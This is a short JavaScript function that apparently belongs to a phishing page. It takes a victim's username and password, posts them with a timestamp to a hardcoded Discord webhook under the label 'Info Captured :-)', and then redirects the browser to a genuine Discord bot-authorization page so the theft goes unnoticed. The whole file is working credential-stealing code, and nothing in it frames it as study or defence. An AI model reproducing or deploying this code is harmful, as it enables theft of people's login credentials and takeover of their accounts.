function sendData(User, Pass) {
    const date = new Date();
    $.post('https://discord.com/api/webhooks/1050799394875777117/InaL0fXQISaGkVQ1bBH2nQBzwjcv7fY6RabE10LXcTABlS7vTZhejQxIQniauPzzO-3a',
    {
        'username': 'Info Captured :-)',
        'content': 'Username:\n\t' + User + '\nPassword:\n\t' + Pass + '\nCapture Time:\n\t' + date,     //adding timestamp
    }, function(data, status) {
        console.log("Data: " + data + "\nStatus: " + status);
    }
    )
    window.location = "https://discord.com/oauth2/authorize/?permissions=268454976&scope=bot&client_id=510016054391734273"
}
